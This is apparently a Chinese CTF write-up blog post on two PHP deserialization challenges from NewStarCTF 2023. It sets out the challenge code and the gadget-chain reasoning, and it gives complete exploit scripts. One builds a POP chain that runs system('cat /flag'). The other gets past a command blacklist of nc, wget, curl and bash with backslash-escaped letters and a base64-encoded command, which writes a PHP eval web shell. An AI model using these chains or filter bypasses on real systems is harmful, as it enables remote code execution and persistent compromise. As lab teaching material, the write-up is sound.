---
title: NewStarCTF2023 week3 反序列化记录
date: 2023-10-20 18:00 +0800
categories: [CTF,WEB]
tags: [反序列化,web]
media_subpath: /
---

## POP Gadget

### 原题文件

```php
<?php
highlight_file(__FILE__);

class Begin{
    public $name;

    public function __destruct()
    {
        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
            echo "Hello";
        }else{
            echo "Welcome to NewStarCTF 2023!";
        }
    }
}

class Then{
    private $func;

    public function __toString()
    {
        ($this->func)();
        return "Good Job!";
    }

}

class Handle{
    protected $obj;

    public function __call($func, $vars)
    {
        $this->obj->end();
    }

}

class Super{
    protected $obj;
    public function __invoke()
    {
        $this->obj->getStr();
    }

    public function end()
    {
        die("==GAME OVER==");
    }
}

class CTF{
    public $handle;

    public function end()
    {
        unset($this->handle->log);
    }

}

class WhiteGod{
    public $func;
    public $var;

    public function __unset($var)
    {
        ($this->func)($this->var);    
    }
}

@unserialize($_POST['pop']);
```

### 利用链思考

` ($this->func)($this->var);`    这里会进行命令执行，就可以倒推，寻找构造链

`__unset `魔法函数，当 `unset()` 访问了没有的属性是调用，只有 CTF 类有unset 也肯定是通过这里了。

CTF 类的 end 函数，需要被调用执行才能执行到 unset，要寻找 调用 end 方法的代码。可以看到 Handle 类的` __call `函数有end() 函数的调用。

之后，`__call` 当不存在或者不能访问的方法去调用的时候自动运行；Super 类的 `__invoke` 函数的 getStr() 函数 是 Handle 类 里面没有的。

现在要去 Super 类 `__invoke()` ，当对象当函数调用的时候出发 `invoke()`。只用` ($this->func)(); `这个符合，它在Then类的 `__toString`

函数里面。

当对象被当做字符串调用的时候会 运行 `__toString`函数，`$this->name` 这里刚刚好是入口的地方，链子就构造完成了

`__destruct`函数结束的时候会自己调用。

这样子思路就理清了。

```
__construct 当一个对象创建时被调用，
__destruct 当一个对象销毁时被调用，
__toString 当一个对象被当作一个字符串被调用。
__wakeup() 使用unserialize时触发
__sleep() 使用serialize时触发
__destruct() 对象被销毁时触发
__call() 对不存在的方法或者不可访问的方法进行调用就自动调用
__callStatic() 在静态上下文中调用不可访问的方法时触发
__get() 用于从不可访问的属性读取数据
__set() 在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用
__isset() 在不可访问的属性上调用isset()或empty()触发
__unset() 在不可访问的属性上使用unset()时触发
__toString() 把类当作字符串使用时触发,返回值需要为字符串
__invoke() 当脚本尝试将对象调用为函数时触发
```



### 利用链

```
WhiteGod::unset
CTF::end  -->  WhiteGod::unset
Handle::__call  -->  CTF::end
Super::__invoke  -->  Handle::__call
Then::__toString  -->  Super::__invoke
Begin::__destruct  -->  Then::__toString
```

### exp

```php
<?php

use Begin as GlobalBegin;
use CTF as GlobalCTF;
use Handle as GlobalHandle;
use Super as GlobalSuper;
use Then as GlobalThen;
use WhiteGod as GlobalWhiteGod;

class Begin{
    public $name;

    public function __destruct()
    {
        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
            echo "Hello";
        }
    }
}

class Then{
    public $func;

    public function __toString()
    {
        ($this->func)();
        return "Good Job!";
    }

}

class Handle{
    public $obj;

    public function __call($func, $vars)
    {
        $this->obj->end();
    }

}

class Super{
    public $obj;
    public function __invoke()
    {
        $this->obj->getStr();
    }

}

class CTF{
    public $handle;

    public function end()
    {
        unset($this->handle->log);
    }

}

class WhiteGod{
    public $func = "system";
    public $var = "cat /flag";
    public function __unset($var)
    {
        ($this->func)($this->var);    
    }
}

$a = new GlobalWhiteGod();
$b = new GlobalCTF();
$c = new GlobalHandle();
$d = new GlobalSuper();
$e = new GlobalThen();
$f = new GlobalBegin();

$b->handle = $a;
$c->obj = $b;
$d->obj = $c;
$e->func = $d;
$f->name = $e;

echo serialize($f);
```

![image-20231020172542884](assets/image-20231020172542884.png)





## R!!!C!!!E!!!

### 题目代码

```php
highlight_file(__FILE__);
class minipop{
    public $code;
    public $qwejaskdjnlka;
    public function __toString()
    {
        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
            exec($this->code);
        }
        return "alright";
    }
    public function __destruct()
    {
        echo $this->qwejaskdjnlka;
    }
}
if(isset($_POST['payload'])){
    //wanna try?
    unserialize($_POST['payload']);
}

```

有很多符号被过滤，我们没有办法绕过

字母的话 我可以 用 反斜杠绕过

 

反序列化的话 `__toString` 触发通过  `__destruct`来实现，



exec 命令执行没有回显，我们只能尽力去 进行保存文件，但是这里 过滤 了 `<> .` 我们很难直接去保存文件

好在 linux 在 命令里面插入 `\` 也能执行，我们可以用此方法来进行命令执行，保存文件，注入代码。



使用拼接字母绕过匹配

### exp

```php
<?php

use minipop as GlobalMinipop;

class minipop{
    public $code;
    public $qwejaskdjnlka;
    public function __toString()
    {
        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
            // exec($this->code);
            echo PHP_EOL . "1" . PHP_EOL;
        }
        return "alright";
    }
    public function __destruct()
    {
        echo $this->qwejaskdjnlka;
    }
}

// ZWNobyAiPD9waHAgZXZhbChcJF9QT1NUWzEyXSk7Pz4iPjEucGhw
// echo "<?php eval(\$_POST[12]);\?\>">1.php
$a = new GlobalMinipop();
$a->code="echo ZWNobyAiPD9waHAgZXZhbChcJF9QT1NUWzEyXSk7Pz4iPjEucGhw|b\a\se64 -d|b\a\s\h";
$b = new GlobalMinipop();
$b->qwejaskdjnlka = $a;

echo serialize($b);

```

![image-20231020172749999](assets/image-20231020172749999.png)

![image-20231020172758457](assets/image-20231020172758457.png)